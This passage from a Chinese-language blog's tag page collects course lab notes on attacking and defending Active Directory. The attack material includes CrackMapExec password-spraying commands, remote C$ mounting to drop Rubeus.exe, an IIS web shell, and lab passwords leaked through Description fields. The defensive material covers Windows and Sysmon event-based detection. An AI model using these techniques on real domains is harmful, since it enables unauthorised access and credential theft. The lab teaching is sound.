</code></pre><p>可以看到上述的權限都沒有在這裏面，也就是說正常的使用者是不會有這兩個權限的，那誰會有這兩個權限呢?需要==impersonation(也就是講師說的切換身分)的人==，詳細的腳本可以看這邊<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>但今天不會用到，總之IIS就是一個需要做身分切換的角色，所以講師已經在Win10的電腦中設定好IIS，也起用了web shell的功能，我們就可以試看看，在browser中<code>http://127.0.0.1/cmd.aspx</code>，他可以直接用IIS的權限執行程式
<img src=https://hackmd.io/_uploads/r1N1LMM03.png alt></p><a href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/>NTUSTISC - AD Note - Lab(Leak Password)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lableak-password>NTUSTISC - AD Note - Lab(Leak Password)
<a class=anchor href=#ntustisc---ad-note---lableak-password>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=lab---leak-password-from-description>==Lab - Leak Password from Description==
<a class=anchor href=#lab---leak-password-from-description>#</a></h3><p>在Win2016的server manager當中，可以從<code>Dashboard/Tools/Active Directory Users and Computers</code>中看到整個網域使用者的部分資料，例如Name, Type和Description，而這個東西其實是所有整個網域使用者都看地到，所以==不可以把機敏資料寫在這裡例如帳密之類的==，就像下面截圖一樣，<code>Fara Iseabal</code>和<code>Lina Allene</code>的密碼都被leak出去了
<img src=https://hackmd.io/_uploads/HktYdvUTh.png alt>
當然，有加入網域的帳號也看的到，從Win10的網域帳號bear中，打開PowerShell
:::spoiler Result</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ Get-ADUser -Filter * -Proper Description | Select-object Name,Description
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Name               Description
</span></span><span style=display:flex><span>----               -----------
</span></span><span style=display:flex><span>Administrator      Built-in account <span style=color:#66d9ef>for</span> administering the computer/domain
</span></span><span style=display:flex><span>Guest              Built-in account <span style=color:#66d9ef>for</span> guest access to the computer/domain
</span></span><span style=display:flex><span>DefaultAccount     A user account managed by the system.
</span></span><span style=display:flex><span>krbtgt             Key Distribution Center Service Account
</span></span><span style=display:flex><span>Coraline Mahalia
</span></span><span style=display:flex><span>Gillian Marsiella
</span></span><span style=display:flex><span>Casi Hyacinth
</span></span><span style=display:flex><span>Mercy Edi
</span></span><span style=display:flex><span>Cyndie Rhodie
</span></span><span style=display:flex><span>Lucilia Lelah
</span></span><span style=display:flex><span>Fred Carmita
</span></span><span style=display:flex><span>Ortensia Fancy
</span></span><span style=display:flex><span>Seana Jeanette
</span></span><span style=display:flex><span>Logan Janeen
</span></span><span style=display:flex><span>Cassondra Lothario
</span></span><span style=display:flex><span>Ollie Dorita
</span></span><span style=display:flex><span>Gertrude Felecia
</span></span><span style=display:flex><span>Ella Randee        New User ,DefaultPassword
</span></span><span style=display:flex><span>Anya Gypsy
</span></span><span style=display:flex><span>Ronni Kristoforo
</span></span><span style=display:flex><span>Maurizia Ines
</span></span><span style=display:flex><span>Reyna Gwendolyn
</span></span><span style=display:flex><span>Garnet Constancia
</span></span><span style=display:flex><span>Darlleen Dorisa
</span></span><span style=display:flex><span>Jessa Corinna
</span></span><span style=display:flex><span>Lorne Celie
</span></span><span style=display:flex><span>Bill Marylee
</span></span><span style=display:flex><span>Berna Raphaela
</span></span><span style=display:flex><span>Gabriel Diannne    Shared User
</span></span><span style=display:flex><span>Caitrin Latia
</span></span><span style=display:flex><span>Selestina Cassi
</span></span><span style=display:flex><span>Carlye Chloette
</span></span><span style=display:flex><span>Dorrie Paolina
</span></span><span style=display:flex><span>Herminia Debby
</span></span><span style=display:flex><span>Rosetta Lotta
</span></span><span style=display:flex><span>Berny Kirby
</span></span><span style=display:flex><span>Moyra Fanechka
</span></span><span style=display:flex><span>Ranee Delinda
</span></span><span style=display:flex><span>Orelee Peri
</span></span><span style=display:flex><span>Shantee Marylin
</span></span><span style=display:flex><span>Annice Eden
</span></span><span style=display:flex><span>Stormie Natala
</span></span><span style=display:flex><span>Glenda Dorrie
</span></span><span style=display:flex><span>Laurena Mirelle
</span></span><span style=display:flex><span>Casandra Cherrita
</span></span><span style=display:flex><span>Lazaro Karoly
</span></span><span style=display:flex><span>Lina Allene        User Password r2NE4/9:F;<span style=color:#f92672>[</span>k
</span></span><span style=display:flex><span>Kiri Kath
</span></span><span style=display:flex><span>Star Rikki
</span></span><span style=display:flex><span>Aloise Elfrida     Shared User
</span></span><span style=display:flex><span>Marylynne Susannah
</span></span><span style=display:flex><span>Sherri Jacquetta
</span></span><span style=display:flex><span>Carey Kincaid
</span></span><span style=display:flex><span>Philippa Eugenie
</span></span><span style=display:flex><span>Dominica Carmon
</span></span><span style=display:flex><span>Eba Luca
</span></span><span style=display:flex><span>Martita Juanita
</span></span><span style=display:flex><span>Ruthie Ebony
</span></span><span style=display:flex><span>Charis Kory
</span></span><span style=display:flex><span>Bambi Etta
</span></span><span style=display:flex><span>Aleda Appolonia    Shared User
</span></span><span style=display:flex><span>Randene Lelah
</span></span><span style=display:flex><span>Issy Eudora
</span></span><span style=display:flex><span>Margo Sharl
</span></span><span style=display:flex><span>Philis Gilli
</span></span><span style=display:flex><span>Reina Claire
</span></span><span style=display:flex><span>Corine Celesta
</span></span><span style=display:flex><span>Lon Sonni
</span></span><span style=display:flex><span>Joyann Sibella
</span></span><span style=display:flex><span>Katee Annemarie
</span></span><span style=display:flex><span>Henrieta Sabine
</span></span><span style=display:flex><span>Daile Odetta
</span></span><span style=display:flex><span>Marney Ranee
</span></span><span style=display:flex><span>Marlyn Loralee
</span></span><span style=display:flex><span>Fara Iseabal       User Password 8F%kJ2q_cVFg
</span></span><span style=display:flex><span>Sofie Darlleen
</span></span><span style=display:flex><span>Jori Floria        Replication Account
</span></span><span style=display:flex><span>Alikee Perri
</span></span><span style=display:flex><span>Karoly Nadeen
</span></span><span style=display:flex><span>Renae Babette
</span></span><span style=display:flex><span>Nolana Rivy
</span></span><span style=display:flex><span>Carmelle Libbi
</span></span><span style=display:flex><span>Sile Rhiamon
</span></span><span style=display:flex><span>Ruthann Britta
</span></span><span style=display:flex><span>Pietra Fern
</span></span><span style=display:flex><span>Amabelle Gayle
</span></span><span style=display:flex><span>Audi Rosalind
</span></span><span style=display:flex><span>Dollie Fayina
</span></span><span style=display:flex><span>Ricca Stefa
</span></span><span style=display:flex><span>Kaja Brenda
</span></span><span style=display:flex><span>Katharina Alyssa
</span></span><span style=display:flex><span>Angelique Hilda
</span></span><span style=display:flex><span>Linda Neda         Shared User
</span></span><span style=display:flex><span>Jerrie Morganne
</span></span><span style=display:flex><span>Giulietta Moyra
</span></span><span style=display:flex><span>Erena Elinore
</span></span><span style=display:flex><span>Lily Kristofor
</span></span><span style=display:flex><span>Kizzee Margaux
</span></span><span style=display:flex><span>Christi Nettle
</span></span><span style=display:flex><span>Lilas Lindy
</span></span><span style=display:flex><span>Celeste Kelci
</span></span><span style=display:flex><span>Berget Celka
</span></span><span style=display:flex><span>Babb Joanne
</span></span><span style=display:flex><span>Andree Suki
</span></span><span style=display:flex><span>Bear Brown
</span></span></code></pre></div><p>:::
帳密一、Lina Allene$\to$<code>r2NE4/9:F;[k</code>
帳密二、Fara Iseabal$\to$<code>8F%kJ2q_cVFg</code></p><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x04leak-password/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/>NTUSTISC - AD Note - Lab(Password Spraying)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---labpassword-spraying>NTUSTISC - AD Note - Lab(Password Spraying)
<a class=anchor href=#ntustisc---ad-note---labpassword-spraying>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)</li><li>Password Spraying(用猜的)<ul><li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來</li><li>Tool: <a href=https://github.com/Porchetta-Industries/CrackMapExec>CrackMapExec</a> - 結合各種功能的內網滲透神器</li></ul></li><li>GPO</li><li>記憶體(lsass)</li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=password-spraying>==Password Spraying==
<a class=anchor href=#password-spraying>#</a></h3><ol><li><p>How to use?</p><ul><li>Cheat Sheet<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ crackmapexec &lt;protocol&gt; &lt;target<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>&gt; -u &lt;a file or string only&gt; -p &lt;a file or string only&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># For example</span>
</span></span><span style=display:flex><span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd
</span></span><span style=display:flex><span>$ crackmapexec smb 10.10.10.100 -u ~/file_usernames -p ~/file_passwords
</span></span><span style=display:flex><span>$ crackmapexec smb 10.10.10.100 -u administrator -p Passw0rd --local-auth
</span></span><span style=display:flex><span>$ crackmapexec smb &lt;filename&gt; -u administrator -p Passw0rd --local-auth
</span></span></code></pre></div><code>--local-auth</code>代表是用本機帳號的角度登入，就不是用domain admin的角度登入</li></ul></li><li><p>Recon Password Policy
在PowerShell中使用<code>$ Get-ADDefaultDomainPasswordPolicy</code>調查Domain上的密碼原則，Note: ==Win2016要打開==</p><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x14password-spraying/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/>NTUSTISC - AD Note - Lab(SMB遠端讀寫)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---labsmb遠端讀寫>NTUSTISC - AD Note - Lab(SMB遠端讀寫)
<a class=anchor href=#ntustisc---ad-note---labsmb%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%ab>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/ubNMQ7_dcm0?si=26g2Lz2CB-O-7S5d">2022/05/11 AD 安全 2</a></p><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><p>這個lab主要和之前不太一樣的地方在於都是利用SMB的功能達到遠端電腦讀寫的效果，雖然遠端執行也可以做到，但這樣會比較方便</p><h3 id=遠端讀寫w-gui>==遠端讀寫(w/ GUI)==
<a class=anchor href=#%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%abw-gui>#</a></h3><ol><li>Open File Explorer</li><li>Enter <code>\\&lt;IP>\c$</code>
For example: <code>\\192.168.222.128\c$</code></li><li>Login Local Admin
<img src=https://hackmd.io/_uploads/S1uCNUBlp.png alt></li></ol><ul><li>Result
我在Win10中利用上述步驟，成功讀取到Win2016的資料
<img src=https://hackmd.io/_uploads/HJbEr8Bxa.png alt></li></ul><h3 id=遠端讀寫wo-gui>==遠端讀寫(w/o GUI)==
<a class=anchor href=#%e9%81%a0%e7%ab%af%e8%ae%80%e5%af%abwo-gui>#</a></h3><p>沒有GUI的情況就需要先掛載遠端的C槽在本地端，然後才可以進行後續的讀寫，有時候他會跳出錯誤</p><ul><li>Cheat Sheet<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ net use <span style=color:#ae81ff>\\</span>&lt;IP&gt;<span style=color:#ae81ff>\C</span>$ <span style=color:#e6db74>&#34;&lt;password&gt;&#34;</span> /user:&lt;username&gt;
</span></span></code></pre></div>:::spoiler Result<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ net use <span style=color:#ae81ff>\\</span>192.168.222.128<span style=color:#ae81ff>\C</span>$ <span style=color:#e6db74>&#34;1qaz@WSX3edc&#34;</span> /user:administrator <span style=color:#75715e># 掛載遠端磁碟</span>
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span><span style=display:flex><span>$ net use <span style=color:#75715e># 查看已掛載的遠端磁碟</span>
</span></span><span style=display:flex><span>會記錄新的網路連線。
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>狀態       本機        遠端                    網路
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------
</span></span><span style=display:flex><span>OK                     <span style=color:#ae81ff>\\</span>192.168.222.128<span style=color:#ae81ff>\C</span>$      Microsoft Windows Network
</span></span><span style=display:flex><span>命令已經成功完成。
</span></span><span style=display:flex><span>$ copy Rubeus.exe <span style=color:#ae81ff>\\</span>192.168.222.128<span style=color:#ae81ff>\C</span>$
</span></span><span style=display:flex><span>複製了         <span style=color:#ae81ff>1</span> 個檔案。
</span></span></code></pre></div><img src=https://hackmd.io/_uploads/BykOL8rgT.png alt>
可以看到Win2016的C槽中多了一個Rubeus.exe的檔案，代表成功
:::</li></ul><h3 id=how-to-detect-smb-access>==How to Detect SMB Access==
<a class=anchor href=#how-to-detect-smb-access>#</a></h3><p>Event ID: 5145
預設不開，因為會有大量的event湧入，除非設定有存取c$的filter，就會少非常多，因為遠端存取c槽本身就蠻可疑的，所以偵測到非法存取的機率就蠻高的</p><a href=/security/course/ntust-isc/ad/4.-%E9%81%A0%E7%AB%AF%E5%9F%B7%E8%A1%8C-%E8%AE%80%E6%AA%94/ntustisc---ad-note---lab0x24smb%E9%81%A0%E7%AB%AF%E8%AE%80%E5%AF%AB/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x17%E5%81%B5%E6%B8%AClsass/>NTUSTISC - AD Note - Lab(偵測LSASS)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab偵測lsass>NTUSTISC - AD Note - Lab(偵測LSASS)
<a class=anchor href=#ntustisc---ad-note---lab%e5%81%b5%e6%b8%aclsass>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>得到更高權限之後，會想要更多的密碼</p><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)</li><li>Password Spraying(用猜的)</li><li>GPO</li><li>記憶體(lsass)<ul><li>How to detect LSASS access?
利用Sysmon這個工具中有設定的event ID: 10，這個工具類似Event Viewer但更多元更強，下載可見<a href=https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon>Sysmon</a></li><li>How to install?
簡單來說它需要先準備一個config file，然後安裝的時候就會一起把config設定好(每一間公司或每一個人都不一樣，算是機密)<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ Sysmon64.exe -i sysmonconfig-export.xml
</span></span></code></pre></div></li></ul></li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=偵測lsass>==偵測LSASS==
<a class=anchor href=#%e5%81%b5%e6%b8%aclsass>#</a></h3><p>利用Sysmon Event ID: 10</p><ol><li>準備sysmonconfig
就像前面說的，每一間公司的sysmonconfig都是機密，所以我們這次的lab，講師也有準備簡易的sysmonconfig<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#f92672>&lt;Sysmon</span> <span style=color:#a6e22e>schemaversion=</span><span style=color:#e6db74>&#34;4.1&#34;</span><span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;HashAlgorithm&gt;</span>SHA256<span style=color:#f92672>&lt;/HashAlgorithm&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;EventFiltering&gt;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;ProcessAccess</span> <span style=color:#a6e22e>default=</span><span style=color:#e6db74>&#34;include&#34;</span><span style=color:#f92672>&gt;</span>   
</span></span><span style=display:flex><span>        <span style=color:#f92672>&lt;/ProcessAccess&gt;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>&lt;/EventFiltering&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;/Sysmon&gt;</span>
</span></span></code></pre></div></li><li>安裝Sysmon
按照前面提到的指令，並把sysconfig準備好<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ Sysmon64.exe -i sysmonconfig-export.xml
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>System Monitor v15.0 - System activity monitor
</span></span><span style=display:flex><span>By Mark Russinovich and Thomas Garnier
</span></span><span style=display:flex><span>Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> 2014-2023 Microsoft Corporation
</span></span><span style=display:flex><span>Using libxml2. libxml2 is Copyright <span style=color:#f92672>(</span>C<span style=color:#f92672>)</span> 1998-2012 Daniel Veillard. All Rights Reserved.
</span></span><span style=display:flex><span>Sysinternals - www.sysinternals.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Loading configuration file with schema version 4.10
</span></span><span style=display:flex><span>Sysmon schema version: 4.90
</span></span></code></pre></div>:::warning
實作中這邊遇到問題，理論上準備好sysmonconfig之後下command應該會安裝，但他只跑到一半就結束了，不確定是不是因為沒有連網還是其他設定沒有做好，總之，sysmon算是不能用了，所以之後還有其他的lab會用到就只能跳過
:::</li><li>Skip</li></ol></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x15%E5%81%B5%E6%B8%AC%E5%AF%86%E7%A2%BC%E6%8F%AE%E7%81%91/>NTUSTISC - AD Note - Lab(偵測密碼揮灑)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab偵測密碼揮灑>NTUSTISC - AD Note - Lab(偵測密碼揮灑)
<a class=anchor href=#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e5%af%86%e7%a2%bc%e6%8f%ae%e7%81%91>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>得到更高權限之後，會想要更多的密碼</p><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)</li><li>Password Spraying(用猜的)<ul><li>和brute force差在哪裡呢?其實概念一樣，只是角度不一樣，brute force是針對一隻帳號，用很多的密碼去猜；而password spraying則是用一組密碼去爆所有的帳號，其實就是反過來</li><li>Tool: <a href=https://github.com/Porchetta-Industries/CrackMapExec>CrackMapExec</a> - 結合各種功能的內網滲透神器</li></ul></li><li>GPO</li><li>記憶體(lsass)</li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=lab-how-to-detect-password-spraying>==Lab: How to detect Password Spraying==
<a class=anchor href=#lab-how-to-detect-password-spraying>#</a></h3><p>利用Event ID: 4625, 4648, 4771的認證失敗紀錄
<img src=https://hackmd.io/_uploads/ryxGszmR2.png alt>
可以看到我是大約在4:52:08左右執行的，有一大堆的4625紀錄，如果抓最後一筆的紀錄，會顯示Account Name就是我們在Kali看到的最後一個帳戶，而且Keyword顯示Audit Failure
<img src=https://hackmd.io/_uploads/SJ0wszXA2.png alt></p></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x11%E5%81%B5%E6%B8%AC%E6%8F%90%E6%AC%8A/>NTUSTISC - AD Note - Lab(偵測提權)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab偵測提權>NTUSTISC - AD Note - Lab(偵測提權)
<a class=anchor href=#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e6%8f%90%e6%ac%8a>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;t=3600">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>提權方法<ul><li>利用弱點</li><li>Hijack Token</li><li>Guess Password</li><li>管理服務</li><li>錯誤配置</li></ul></li></ul><h2 id=lab-time---本地提權>Lab Time - 本地提權
<a class=anchor href=#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a>#</a></h2><h3 id=偵測network-service提權>==偵測Network Service提權==
<a class=anchor href=#%e5%81%b5%e6%b8%acnetwork-service%e6%8f%90%e6%ac%8a>#</a></h3><p>利用Event ID: 4624</p><ul><li>類型: 5</li><li>虛擬帳戶: 是</li><li>提高權限的權杖: 是
這樣的rule會有高機率命中，但經過實測會發現他不會顯示出類型5和虛擬帳戶為是的event，只有類型3會被顯示出來，如下圖
<img src=https://hackmd.io/_uploads/ryoW9NfC3.png alt></li></ul></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/1.-%E7%92%B0%E5%A2%83%E8%AA%BF%E6%9F%A5normal/ntustisc---ad-note---lab0x05%E5%81%B5%E6%B8%AC%E6%9F%A5%E8%A9%A2%E7%9A%84%E6%93%8D%E4%BD%9C/>NTUSTISC - AD Note - Lab(偵測查詢的操作)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---lab偵測查詢的操作>NTUSTISC - AD Note - Lab(偵測查詢的操作)
<a class=anchor href=#ntustisc---ad-note---lab%e5%81%b5%e6%b8%ac%e6%9f%a5%e8%a9%a2%e7%9a%84%e6%93%8d%e4%bd%9c>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=SycYwgWohlu97dc3">2022/05/04 AD 安全1</a></p><h2 id=lab-time---環境調查>Lab Time - 環境調查
<a class=anchor href=#lab-time---%e7%92%b0%e5%a2%83%e8%aa%bf%e6%9f%a5>#</a></h2><h3 id=lab---how-to-observe-theyve-audited-the-record>==Lab - How to observe they&rsquo;ve audited the record?==
<a class=anchor href=#lab---how-to-observe-theyve-audited-the-record>#</a></h3><p>像前面說的，如果在群組的user要觀察ad的name, description之類的，要如何觀察到他們正在做的事情?可以利用==Windows Event ID: 4662==，這個event ID會針對所有user對LDAP的查詢進行log，這樣不管是誰進行查詢都會留下紀錄，但是事先要啟用(預設不開)</p><ol><li><p>GPO(Group Policy Object)啟動相關事件稽核
在Win2016一開機會啟動Server Manager，其中的<code>Tools/Group Policy Management</code>
<img src=https://hackmd.io/_uploads/H1ZYPF7Rn.png alt></p><p>點選進去後在<code>Forest:kuma.org/Domains/kuma.org/Default Domain Policy</code>按右鍵選取Edit就會看到==Group Policy Management Editor==
<img src=https://hackmd.io/_uploads/H1bx_t7C3.png alt></p><p>接著在<code>Group Policy Management Editor/Computer Configuration/Policies/Windows Settings/Security Settings/Local Policies/Audit Policy</code>中可以找到==Audit directory service access Properties==，勾選起來就可以了
<img src=https://hackmd.io/_uploads/ByynOtmC3.png alt></p></li><li><p>使用者管理開啟進階功能</p><ul><li>接下來要設定哪些使用者的這些行為要被稽核，首先打開Windoes Startup中有一個==Active Directory Users and Computers==
<img src=https://hackmd.io/_uploads/rJxddjPp3.png alt></li><li>進入View中把Advanced Features功能打開
<img src=https://hackmd.io/_uploads/ryIsdow6n.png alt></li><li>接著左邊的列表會出現一些東西，包含Users，我們右鍵Users選擇屬性，並進入Security/Advanced/Auditing
<img src=https://hackmd.io/_uploads/HJexFjDp3.png alt></li><li>進行新增，最上面的Principle直接打Everyone就可以了，代表任何人，下面的Permission勾選<code>List Contents</code>
<img src=https://hackmd.io/_uploads/S1I8KswT3.png alt></li><li>這一連串的操作就代表，任何人只要在kuma這個網域底下進行List Content的操作，AD DC都會偵測到進行紀錄
:::spoiler Result
<img src=https://hackmd.io/_uploads/Hy8yjiDTh.png alt>
稍微解釋一下，做邊是kuma.org網域的bear帳戶，在右下角有顯示時間為12:37，此時進行<code>net user /domain</code>的操作，而右邊是DC，我們利用Event Viewer進行查看Event ID: 4662中的確記錄到此次event，而查詢的帳號也的確是bear
:::</li></ul></li></ol><hr></p></article><ul class="pagination pagination-default"><li class="page-item disabled"><a aria-disabled=true aria-label=First class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;&#171;</span></a></li><li class="page-item disabled"><a aria-disabled=true aria-label=Previous class=page-link role=button tabindex=-1><span aria-hidden=true>&#171;</span></a></li><li class="page-item active"><a aria-current=page aria-label="Page 1" class=page-link role=button>1</a></li><li class=page-item><a href=/tags/ad/page/2/ aria-label="Page 2" class=page-link role=button>2</a></li><li class=page-item><a href=/tags/ad/page/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/ad/page/2/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/ad/page/3/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
